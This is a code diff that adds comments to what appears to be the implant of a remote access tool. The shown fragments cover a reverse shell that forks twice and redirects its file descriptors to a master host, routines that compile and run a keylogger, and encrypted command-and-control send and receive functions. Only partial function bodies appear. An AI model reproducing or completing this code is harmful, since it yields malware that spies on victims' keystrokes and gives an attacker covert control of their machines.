@@ -10,6 +10,7 @@ from utils.crypto import crypto_run
 
 
 def reverse_shell(master_hostname, shell_port):
+    # fork twice, kill parents, redirect in, out and err fds and run bash interactive shell 
     pid = fork()
     if pid == 0:
         pid2 = fork()
@@ -24,6 +25,7 @@ def reverse_shell(master_hostname, shell_port):
     exit(0)
 
 def compile_keylogger():
+    # compile keylogger into executable for correct arch
     pid = fork()
     if pid == 0:
         pid2 = fork()
@@ -35,6 +37,7 @@ def compile_keylogger():
         exit(0)
 
 def run_keylogger():
+    # run keylogger executable
     pid = fork()
     if pid == 0:
         pid2 = fork()
@@ -49,6 +52,7 @@ def run_keylogger():
 
 
 def send_res(conn, res):
+    # encrypted plain text response and send to master
     try:
         res = "ACK" + res
         encoded_res = res.encode("utf-8")
@@ -61,6 +65,7 @@ def send_res(conn, res):
 
 
 def recv_cmd(conn, buffer):
+    # receive encrypted response from master and decrypt
     try:
         encrypted_cmd = conn.recv(buffer)
         encoded_cmd = crypto_run("decrypt", encrypted_cmd) 
@@ -72,6 +77,7 @@ def recv_cmd(conn, buffer):
 
 
 def cmd_shell(conn, master_hostname, master_port):
+    # command shell interface
     while True:
         conn, cmd = recv_cmd(conn, 1024)
         res = ""
